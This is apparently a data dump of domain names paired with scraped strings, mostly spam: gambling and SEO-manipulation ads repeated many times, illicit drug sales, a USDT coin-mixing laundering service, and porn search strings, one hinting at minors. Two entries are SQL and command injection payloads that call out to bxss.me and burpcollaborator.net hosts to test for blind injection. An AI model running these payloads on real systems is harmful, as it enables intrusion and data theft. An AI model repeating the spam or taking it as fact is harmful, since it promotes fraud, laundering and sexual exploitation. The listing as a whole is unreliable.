('www.55hn.cc', '缅甸华纳国际赌场怎么注册开户  网址：www.55hn.cc   QQ：3443033649   飞机：@hnayjf2255')
('ggzyjy.linhai.gov.cn', 'http://ggzyjy.linhai.gov.cn/dhqlc/framework/main/Default.aspx?p=0000302&Id=20221103152334524&fid=20221103152025056&op=down')
('gk.chengdu.gov.cn', 'http://gk.chengdu.gov.cn/uploadfiles/070306020601/2019042610115463.xls')
('acg.gamersky.com', 'http://acg.gamersky.com/pic/201604/739208.shtml')
('www.88071798.com', 'www.88071798.com【17l97OO5555ybt】Ohk.zq.0201')
('f8bet.co', 'F8Bet.Co【Copy Ngay_Taixiu.bet_Tặng Cược Miễn Phí】 Search Google 【SOSO CASINO】 VIP')
('shehabnews.com', 'https://shehabnews.com/uploads/documents/2021/08/Yli2e.xlsx')
('roy.bet', 'Roy.Bet - Đăng Ký Nhận Ngay 10k【Copy_S777web.com_Tặng Cược Miễn Phí 】 Search Google 【S777, S777 Game Bài】 VIP')
('bet.com', 'slot bet.com 【OPEN∶casino168.ph】slot bet.com 【OPEN∶casino168.ph】w2yj0vrht')
('kroah.com', 'Y1jWCCd2Kkcrk0W/@kroah.com')
('53914.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《53914.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，站群程序php。')
('git.apache.org', '<8ecf968298dd4344b012f2a1f24aef90@git.apache.org>')
('w88.vin.link', 'download w88.vin.link【vn887.com】Nền tảng trò chơi được chỉ định của world Cup 2022【Đi vào link∶vn887.com】Takbet明光3j')
('rituyuzu.blogspot.com', 'rituyuzu.blogspot.com/')
('c.cc', '\nhow does robinhood make moneyt OnE o c.cc')
('20.hatenadiary.jp', 'piyolog ClearOne 120°ワイドアングルカメラ Unite 20.hatenadiary.jp')
('www.hebeihaowei.cn', 'www.hebeihaowei.cn/Item/Show.asp?m=119&amp;d=38')
('85935.liuhen.cc', '585+谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序+google引粉程序+谷歌蜘蛛池排名+google蜘蛛池收录+google快排程序《85935.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录+爬虫网站搜索技巧')
('fukidesign.com', 'https://fukidesign.com/')
('68288.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《68288.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，小猪cms功能列表。')
('lyylj.gz.gov.cn', 'http://lyylj.gz.gov.cn/attachment/6/6733/6733804/6987977.xls')
('89514.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《89514.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，黑帽悬猴有什么特点。')
('vn88.io', 'https://vn88.io/')
('www.dota2.com', 'http://www.dota2.com/international/overview/')
('k88.cc', 'k88.cc刘泊温单双王【输入∶AK6998.com】六分新加坡快三金牌导师单带回血】大乐透18003期杀号【打开网址∶AK6998.com】高速快乐彩金牌导师单带回血】0k8kxr1i4')
('www.artagenda.jp', 'https://www.artagenda.jp/museum/detail/13')
('dbestchou.com', 'Specialising in auctions for over 10 yearsenjoybid Official Site dbestchou.com')
('lzxlzy.com', '[市价交易：lzxlzy.com]搜狐号自媒体注册容易吗')
('cp-99.com', '彩票99_CP-99.com_爱赢博彩娱乐\n')
('sucabija.blogspot.com', 'sucabija.blogspot.com/')
('kexugevo.blogspot.com', 'kexugevo.blogspot.com/')
('jun8877.com', 'jun8877.com【TG飞机∶@AK5537】google竞价广告投放】上海優化推廣【telegram∶@AK5537】INS,脸书竞排名价推广】ukngv2jn8')
('gj.com', '亚博『谷歌外推飞机@ehseo6』zjhslink亚博app,亚博体育,亚博体育app,亚博电竞,亚博国际,亚博娱乐,亚博娱乐城,亚博体育官网,亚博体育网址,亚博体育平台,亚博最新官网网址,亚博体育网页登录,亚博yabo888vip官网-QJ VX gj.com')
('t2102-3344.hatenadiary.jp', 'piyolog Disney スウェットパーカー XLサイズ ディズニー ミッキー 黒 ブラック 古着卸 アメリカ仕入 t2102-3344.hatenadiary.jp')
('www.morfix.co.il', 'http://www.morfix.co.il/en/d?Query=qq')
('74739.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《74739.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，网络推广关键词优化官网。')
('68bet.vn', '68bet.vn【TG電報∶@XK5537】代google開戶seo投放靠譜】888bet77.com【TG电报∶@AK5537】FACEBOOK全世界开户】a8tc7iqto.com')
('tedazufo.blogspot.com', 'tedazufo.blogspot.com/')
('sli.do', '47619123-匿名提問的工具(sli.do和google雲端簡報)')
('www.yqhd8.com', 'www.yqhd8.com/xb/379256')
('gnews.org', 'gnews.org/post/p1moq6ae9')
('bet73.net', '開平外貿網站製作推廣【TG電報∶@XK5537】google開戶競價投放包上】bet73.net【TG電報∶@XK5537】代谷歌開戶seo推廣包上】s0sah5hq4')
('25595.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《25595.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，莒县百度搜索引擎网站排名。')
('15413.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《15413.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，如何搜索微博营销数据。')
('ta88app.link', 'link+vào+ta88+【ta88app.link】+ta88+apk+ios+android+pc+【ta88app.link】')
('f1.vpm231.online', '조루방지제 구매처〓 ☜(^ω^)☞ F1.vpm231.online ☜(^ω^)☞ º비아그라판매≫온라인 여성흥분제구입처∞정품 비아그라 구매㎣정품 발기부전치료제구입사이트▲물뽕구매약국▩프로코밀당일배송╊.bnk')
('5bet999.com', '跑分交易程序定制【telegram∶@AK5537】代google霸屏开户推广包上】5bet999.com【telegram∶@AK5537】代google开户竞价投放包上】1qhw69ddy.com')
('nudikebe.blogspot.com', 'nudikebe.blogspot.com/')
('43463.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《43463.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，游戏网站制作视频教程。')
('www.jnjy.net.cn', 'http://www.jnjy.net.cn/uploadfile/2021/07/20210711154150590.xlsx')
('1325.liuhen.cc', '谷歌引粉【联系飞机：@lishengzhe】蜘蛛多，收录快！-1325.liuhen.cc了解咨询！搜狗蜘蛛池站群源码-adid=1223412422')
('www.shonenjump.com', 'https://www.shonenjump.com/j/weeklyshonenjump/')
('www.nur.cn', 'www.nur.cn/news/2019/01/4343275.shtml')
('www.chiba.med.or.jp', 'https://www.chiba.med.or.jp/personnel/vaccination/download/list_list08_07_2022_1006.xlsx')
('joyvip.fun', 'Joyvip.Fun【Copy_Sodo66.ph_Tặng Cược Miễn Phí 】 Search Google 【SOSO CASINO】 VIP')
('www.busnavi-okinawa.com', 'https://www.busnavi-okinawa.com/top')
('top.forex', 'how much does a forex trader earn【TG:@vip4fx】【mt4 trade manager forex peace army，what is a top.forex trader called，forex news trader settings，forex trader mortgage《TG:@vip4fx》copy trader forex malaysia】master forex trader hilton')
('72922.liuhen.cc', '489+谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序+google引粉程序+谷歌蜘蛛池排名+google蜘蛛池收录+google快排程序《72922.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录+搜索留痕收录地址是繁体')
('poliselo.blogspot.com', 'poliselo.blogspot.com/')
('94672.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《94672.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，谷歌seo推广薪水。')
('radiopaedia.org', 'https://radiopaedia.org/articles/pneumoperitoneum')
('6t.com', 'world cup tv【URL：6t.com】')
('zz-3899.liuhen.cc', 'q-11000-00---off-0hdict--00-1----0-10-0---0---0direct-10-ED--4--textpukuielbert,textmamaka-----0-1l--11-en-Zz-1---Zz-1-home-谷歌蜘蛛池收录【联系飞机：@lishengzhe】蜘蛛多，收录快！Zz-3899.liuhen.cc了解咨询！搜狗蜘蛛池站群源码Zz-adid=3495422799--00-3-1-00-0--4----0-0-11-00-0utfZz-8-00')
('www.yunfuyaoqingren8.cn', '云付www.yunfuyaoqingren8.cn')
('ffrr.cc', '香港金牛网【url:ffrr.cc】dy')
('12724.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《12724.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，泛解析搭建分站。')
('kok.app', 'kok.app_永久网址:SE8.TV__a')
('suboqeha.blogspot.com', 'suboqeha.blogspot.com/')
('hn157.com', '华纳国际游戏官网hn157.com')
('cloud.tencent.com', 'cloud.tencent.com/document/product/555/14170')
('zz-4811.liuhen.cc', 'q-11000-00---off-0hdict--00-1----0-10-0---0---0direct-10-ED--4--textpukuielbert,textmamaka-----0-1l--11-haw-Zz-1---Zz-1-home-google搜索留痕【联系飞机：@lishengzhe】蜘蛛多，收录快！Zz-4811.liuhen.cc了解咨询！谷歌seo站群优化系统Zz-adid=7477264825--00-3-1-00-0--4----0-0-11-00-0utfZz-8-00')
('www.pef.hacienda.gob.mx', 'https://www.pef.hacienda.gob.mx/work/models/PEF/Analiticos_Historico/2018/Autorizado/ac01_ra_og_ur.xlsx')
('app.huid50.com', 'site:app.huid50.com')
('zz-9848.liuhen.cc', 'q-11000-00---off-0hdict--00-1----0-10-0---0---0direct-10-ED--4--textpukuielbert,textmamaka-----0-1l--11-haw-Zz-1---Zz-1-home-谷歌引粉【联系飞机：@lishengzhe】蜘蛛多，收录快！Zz-9848.liuhen.cc了解咨询！谷歌站群管理系统cmsZz-adid=8625213394--00-3-1-00-0--4----0-0-11-00-0utfZz-8-00')
('kjj.my.gov.cn', 'http://kjj.my.gov.cn/myoldfiles/image20090724/434566.doc')
('33764.liuhen.cc', '935+谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序+google引粉程序+谷歌蜘蛛池排名+google蜘蛛池收录+google快排程序《33764.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录+搜索引擎seo优化方式')
('suvigale.blogspot.com', 'suvigale.blogspot.com/')
('hotmaril.com', '[DAPP：hotmaril.com]广告特色鸡')
('www.homeforsmes.com.cn', 'https://www.homeforsmes.com.cn/downloadMongo.do?uploadFileMongoId=61d64b6699320a280da5f596')
('k777.top', '프릴리지복제약처방전─홈페K777.TOP☤톡BOQI88✈비아그라복제약가격☑시알리스지속시간☿프릴리지복제약처방class')
('guangdong.hteacher.net', 'https://guangdong.hteacher.net/uploads/soft/170509/75-1F509163039.xls')
('hk.teva.com', '【TOPick 獨家優惠限時搶】即拎「HK.TEVA.COM 香港網上商店」全單額外八折折上折優惠碼 -1000份-')
('ogp.hinative.com', 'http://ogp.hinative.com/ogp/question?dlid=89&l=zh-CN&lid=82&txt=%C2%BFEn+Colombia+funciona+la+convenci%C3%B3n+de+Ginebra+o+de+Viena+sobre+tr%C3%A1fico+vial+internacional%3F&ctk&ltk&qt=CountryQuestion&w=1200')
('channuoivietnam.com', 'http://channuoivietnam.com/?wpdmact=process&did=MTkwNy5ob3RsaW5r')
('buquyota.blogspot.com', 'buquyota.blogspot.com/')
('5864.liuhen.cc', '谷歌蜘蛛池收录【联系飞机：@lishengzhe】蜘蛛多，收录快！-5864.liuhen.cc了解咨询！搜狗站群霸屏引流系统-adid=3823897946')
('14.law', '향남립카페┊【도배광고필요하시면텔레KQQ77】용인오피✙양주OP┊청주휴게텔金14.law')
('hitzkglgzinjx1d7da.bxss.me', '<a+href="0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z">_2_</a>$(nslookup+hitzkglgzinjx1d7da.bxss.me||perl+-e')
('www.bolivianamimi.com', 'mimi_com_plug_anal_gigante..._os_melhores_videos_em_www.bolivianamimi.com')
('f8bet01.com', 'f8bet01.com【TG飞机∶@AK5537】谷歌代开户】微信引粉多少錢【TG飛機∶@XK5537】google開戶seo霸屏專業】yu3udlgw5')
('aspnet.unesco.org', 'https://aspnet.unesco.org/en-us/Lists/National%20Coordinators/PublicDispForm.aspx')
('cigijuxe.blogspot.com', 'cigijuxe.blogspot.com/')
('35515.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《35515.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，外链发布的正确方法。')
('mobetterb2.eventbrite.com', '/d/il--chicago/mobetterb2.eventbrite.com/?page=13')
('qyb66.com', '[元宇宙：qyb66.com]语文课堂实拍')
('vufuxawa.blogspot.com', 'vufuxawa.blogspot.com/')
('secure.espncdn.com', 'https://secure.espncdn.com/combiner/c?css=disneyid/core.css')
('wx23.com', '森林舞会网址wx23.com（┿嶶5925538）')
('cdnfile.op110.com.cn', 'http://cdnfile.op110.com.cn/files/2144/image/20191106/阿拉阿查森林公园_1570074632894[1]_1573032719300.jpg')
('c0.thejournal.ie', 'http://c0.thejournal.ie/media/2014/01/punchdown.gif')
('76436.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《76436.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，qq群排名优化软件破解。')
('rico.com', 'does forex com trade bitcoin【TG:@vip4fx】【which forex broker tobuse in puerto rico.com，best forex options broker us，forex trader jobs in dubai，trade signals forex for free《TG:@vip4fx》forex trading confirmation before entry a trade】best forex broker metatrader 5')
('gw.hyorim.co.kr', 'http://gw.hyorim.co.kr/api/mail/filedownload/download?fileno=1128184')
('www.grandecentrepointpattaya.com', 'https://www.grandecentrepointpattaya.com/cn/rooms/panoramic-suite-seaview?utm_source=weibo&amp;utm_medium=Social')
('lup.lub.lu.se', 'oai\\:lup.lub.lu.se\\:f8d9c6d2-7e28-4fbe-86b8-6e8f8e015653')
('katowice.naszemiasto.pl', 'https://katowice.naszemiasto.pl/nowy-apartamentowiec-przy-opolskiej-w-katowicach-powstaje/ar/c1-7713395')
('99768.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《99768.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，永年搜狗搜索引擎排名。')
('ae888.net', 'https://ae888.net/')
('www.wordfrequency.info', 'https://www.wordfrequency.info/samples/wordFrequency.xlsx')
('idioms.thefreedictionary.com', 'http://idioms.thefreedictionary.com/bestie')
('43287.liuhen.cc', '492-谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序-google引粉程序-谷歌蜘蛛池排名-google蜘蛛池收录-google快排程序《43287.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录-寄生虫程序出售-gifs')
('mmm.bb1r.com', 'http mmm.bb1r.com')
('apply.questbridge.org', 'https://apply.questbridge.org/register/?id=ef243837-1201-4291-b42b-cc383e6637f1')
('me.popsugar.com', 'https://me.popsugar.com/celebrity/Taraji-P-Henson-Engagement-Ring-Fox-Upfronts-May-2018-44843527?force_slideshow=1')
('4bet.vip', '4bet.vip【TG电报∶@AK5537】谷歌搜索推广，专业推广google网赚引流，google外贸引流】吉尔吉斯斯坦谷歌开户投放【TG电报∶@AK5537】谷歌优化霸屏投放专业】9wtwinnzh')
('lkl21ssk3-yn.hatenadiary.jp', 'piyolog kelen ケレン クレープフレアーロングスカート“Teel” lkl21ssk3-yn.hatenadiary.jp')
('scuir.com', '[DAPP：scuir.com]张亚莲老师')
('house.people.com.cn', 'http://house.people.com.cn/nj/')
('mi3it.com', '[挖矿：mi3it.com]公司地址注銷|横栏哪有快递地址电话|龙海区老年委地址')
('thxploan.com', 'สินเชื่อ ออมสิน 300000 【Thxploan.com】 สินเชื่อ ออมสิน 300000')
('informahealthcare.com', 'q=Caribbean+and+Hawaiian+Islands+Mitochondrial+DNA+Downloaded+from+informahealthcare.com+by+Dr.+Sergios-Orestis+Kolokotronis+on+07/15/11+For+personal+use+only.')
('www.rtsoft.ru', 'http:  www.rtsoft.ru catalog soft scada detail 343 ')
('picfp.cqvip.com', 'http://picfp.cqvip.com/2013pic/2013jy81/l1/85074x/000/003/45780797_1.gif')
('dooek.com', '营销策划qq4100506叶Dooek.com')
('www.fonction-publique.gouv.fr', 'https://www.fonction-publique.gouv.fr/files/files/publications/coll_outils_de_la_GRH/SFT/Calculatrice_SFT.xlsx')
('news.yiche.com', 'https://news.yiche.com/hao/wenzhang/30769363')
('www.xg55.com', 'www.xg55.com【五点综合来料Q群:238712215】85opo')
('www.oikiiin.com', 'https://www.oikiiin.com/yellow-nose/')
('m.500.com', '排列三图库+m.500.com〖加微v信weiwei776699〗※')
('www.invitalia.it', 'https://www.invitalia.it/-/media/invitalia/documenti/rafforziamo-le-imprese/fondo-salvaguardia/doc-novembre-22/3_1-dichiarazione-requisiti-generali-impresa-in-difficolt-oggetto-di-acquisizione_new.doc?la=it-it&hash=CC71CE177BC52F80E86875C085E134E71A0FD298')
('6pwyp64ejv7omvs4jf2kbll6qxwyx2ltnhe44st.burpcollaborator.net', "(select+load_file('\\\\\\\\6pwyp64ejv7omvs4jf2kbll6qxwyx2ltnhe44st.burpcollaborator.net\\\\rnn'))")
('onamae.com', 'Whois Privacy Protection Service by onamae.com')
('opus.bath.ac.uk', 'oai\\:opus.bath.ac.uk\\:46455')
('yiningwz.kyqmen.com', '���� yiningwz.kyqmen.com')
('57bet.cc', '57bet.cc【TG电报∶@AK5537】google开户优化霸屏靠谱】虚拟币交易程序源码系统【telegram∶@XK5537】代谷歌seo霸屏投放專業】3vf2j75iq')
('www.nier.go.jp', 'https://www.nier.go.jp/22chousakekkahoukoku/factsheet/data/22p_424.xlsx')
('nu.com', '免费阅友小说下载-20221023-nx WW C zF Nu.com')
('consult.education.gov.uk', 'https://consult.education.gov.uk/funding-policy-unit/high-needs-funding-reform-2/supporting_documents/Illustrative%20high%20needs%20national%20funding%20formula%20allocations.xlsm')
('nudevista.club', 'qolka+somali+wasmada+site:nudevista.club')
('www.jutoula.com', 'www.jutoula.com/photo/peixiuzhi/18/')
('23318.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《23318.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，搜狗站群管理系统cms。')
('c-ssl.duitang.com', 'http://c-ssl.duitang.com/uploads/item/201812/01/20181201201832_jvftt.thumb.400_0.gif')
('kyotogojyo-aeonmall.com', 'https://kyotogojyo-aeonmall.com/')
('7263.liuhen.cc', '搜索留痕发外链推广引流【纸飞机：@lishengzhe】-7263.liuhen.cc了解咨询！小偷程序泛站群程序收录高，排名好，日获百万IP！adid')
('sn162.hatenadiary.jp', 'piyolog SNOOPY スヌーピー スマートキーケース グリーン SN162.hatenadiary.jp')
('curiosidades.batanga.com', 'http://curiosidades.batanga.com/sites/curiosidades.batanga.com/files/Como-funciona-un-panel-solar-1.jpg')
('indian-xxx-porn.com', 'very young teenn site:indian-xxx-porn.com')
('zusugiqe.blogspot.com', 'zusugiqe.blogspot.com/')
('fuck-sex-videos.com', 'love xxx somalia site:fuck-sex-videos.com')
('gamuboja.blogspot.com', 'gamuboja.blogspot.com/')
('www.anime-sharing.com', 'http://www.anime-sharing.com/forum/members/futaboy-76202/')
('jtys.km.gov.cn', 'https://jtys.km.gov.cn/upload/resources/file/2022/10/28/3746937.xls')
('wzzz8888.com', 'wzzz8888.com现场开户官方网址TL262.COM')
('1bet01.com', '1bet01.com【TG电报∶@XK5537】google广告合作联系，google留痕转码推广，google广告合作联系】罗马尼亚网赚引流【telegram∶@AK5537】代google霸屏seo推广专业】定lr0袢')
('39582.liuhen.cc', '641+谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序+google引粉程序+谷歌蜘蛛池排名+google蜘蛛池收录+google快排程序《39582.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录+seo快速排名软件销售')
('www.9ku.com', '九酷音乐网+www.9ku.com')
('goflah.com', '[庄家：goflah.com]主播新闻播')
('qo.vip', '\nn1 casino best gameif ka Qo.vip')
('currencymixed.com', 'USDT匿名平台【currencymixed.com】泰达币洗币平台(平台currencymixed.com)USDT匿名隐私交易,USDT混币平台')
('yeyehafu.blogspot.com', 'yeyehafu.blogspot.com/')
('tructiepgame.vn', 'Tructiepgame.Vn【Copy_Vb68.pro_Tặng Cược Miễn Phí 】 Search Google 【Vb68,Vb68bet,Vb68fun,Nhacaivb68】 VIP')
('zeyimeri.blogspot.com', 'zeyimeri.blogspot.com/')
('uuhon.com', '+유유닷컴+【uuhon.com】군산유흥』베트남+업소✹군산핸플➢군산키스방†군산립카페↙군산오피や군산op「군산스파')
('eccp.poste.dz', 'eccp.poste.dz consultation compte ccp')
('fo.com', '网红女主播下载-20221024-aL Rn V ub FO.com')
('kucatuya.blogspot.com', 'kucatuya.blogspot.com/')
('event.mi.com', 'https://event.mi.com/global/challenge2019/global-photography/photo/13541')
('www.biggo.com.tw', 'www.biggo.com.tw/s/有其田/')
('m.tuniucdn.com', 'http://m.tuniucdn.com/fb2/t1/G3/M00/28/73/Cii_NllbY7uINOAbAAJYafnMV60AACgQQHRuBQAAliB476.JPG')
('308k.com', '一码中特308k.com【官网aa729.vip】真人在线彩票，棋牌，百家乐，六合彩，北京赛车，大乐透，龙虎斗，世界杯【官网aa729.vip】老牌信誉万人在线，任意存提，大额无忧】个旧yi5X')
('www.vancouverisawesome.com', 'https://www.vancouverisawesome.com/the-mix/shopify-suncor-contribute-to-rebound-for-sptsx-composite-us-markets-also-up-4698382')
('bitbucket.org', 'git clone git@bitbucket.org:name/name.git -b yourBranch --single-branch --depth 10')
('sfs.nau.edu.cn', 'https://sfs.nau.edu.cn/_upload/article/files/8b/fb/a446b64940e8b6086f1f94496dbe/05cc15d6-c67f-4063-8768-ca0356242b42.xlsx')
('zexohetu.blogspot.com', 'zexohetu.blogspot.com/')
('tz438.sdwffg.com', '���� tz438.sdwffg.com')
('www.net-ilinkinsurance.com', 'www.net-ilinkinsurance.com')
('www.doumen.gov.cn', 'http://www.doumen.gov.cn/attachment/cmsfile/jyfbzt/zszy/201708/daofile/34518P020170822751527370909.xls')
('44bet.vip', '44bet.vip【TG飛機∶@XK5537】代google競價seo霸屏專業】磨砂粉引瓷器是如何烧制的【telegram∶@XK5537】代google競價優化投放專業】hwo5zpy52')
('88577.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《88577.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，织梦cms用来干嘛。')
('xvideoz.win', 'maryamhiyana hausa xxx site:xvideoz.win')
('75.md', 'дробилка zenith csb 75.md')
('24h.vn', 'bong da 24h.vn 【Telegram∶@KK6638】Welcome To Casino Online【appkiếm tiềnmùa dịch】【Telegram∶@KK6638】Welcome To Casino Onlineowz')
('cessae.egloos.com', 'http://cessae.egloos.com/3547766')
('modpure.co', 'Modpure.Co【Copy_Sodo66.ph_Tặng Cược Miễn Phí 】 Search Google 【SOSO CASINO】 VIP')
('smzt.gd.gov.cn', 'http://smzt.gd.gov.cn/attachment/0/439/439012/3475152.xlsx')
('p3888.com', 'P3888.com【TG电报∶@AK5537】INS,FACEBOOK代竞价开户】58的推廣的效果怎麽樣【TG飞机∶@AK5537】谷歌霸屏开户推广专业】bf1oti6og.com')
('5254.liuhen.cc', 'google搜索留痕【联系飞机：@lishengzhe】蜘蛛多，收录快！-5254.liuhen.cc了解咨询！站群优化关键词系统-adid=8263126222')
('35456.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《35456.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，网上那些用手机赚钱。')
('moil.nic.in', 'https://moil.nic.in/userfiles/Updated_Network%20Hospitals_17-04-2022.xlsx')
('im.qq.com', 'qq邮箱http;//im.qq.com')
('job.gdpnc.edu.cn', 'https://job.gdpnc.edu.cn/_upload/article/files/34/c2/0c401c2e4d8d9f533dc117e49104/908af95b-c88a-4464-a2f4-cca0e5543eea.xls')
('3g.douban.com', 'https://3g.douban.com/people/59878626/collection')
('taxek.com', '4C营销理论qq4100506古tAXek.com')
('www.3dc678.com', 'http://www.3dc678.com/')
('tvb.com', 'Template:萬千星輝頒獎典禮tvb.com微博人氣大獎')
('309.cwuu.cn', '���� 309.cwuu.cn')
('qugufaro.blogspot.com', 'qugufaro.blogspot.com/')
('qqgemar.com', 'site:qqgemar.com')
('ksj-1620.hatenadiary.jp', 'piyolog リョービ KSJ-1620.hatenadiary.jp')
('43735.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《43735.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，百度打击蜘蛛池。')
('www.kolapet.com', 'sus904l����ְ�ġ���ϵ:13771488118��www.kolapet.com��')
('aamqyz.blogspot.com', 'aamqyz.blogspot.com/')
('85595.liuhen.cc', '857+谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序+google引粉程序+谷歌蜘蛛池排名+google蜘蛛池收录+google快排程序《85595.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录+telegram加群详细教程')
('96247.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《96247.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，吉林seo刷关键词排名优化。')
('hm.com', '快手上热门秘籍内容-20221018-lx HS M sW Hm.com')
('lokeqace.blogspot.com', 'lokeqace.blogspot.com/')
('bet55.vip', 'bet55.vip【TG电报∶@XK5537】谷歌广告合作联系，谷歌推广公司，google留痕推广】巴林谷歌开户优化投放【TG電報∶@XK5537】代谷歌霸屏優化霸屏包上】d583f0atg')
('22911.liuhen.cc', '634+谷歌搜索留痕【飞机：@lishengzhe】google搜索留痕程序+google引粉程序+谷歌蜘蛛池排名+google蜘蛛池收录+google快排程序《22911.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录+霸屏广告设备')
('9ku.com', '九酷音乐网+9ku.com')
('18495.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《18495.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，东海百度搜索引擎排名优化。')
('newpicfp.cqvip.com', 'http://newpicfp.cqvip.com/2018pic/882/674505979_1.gif')
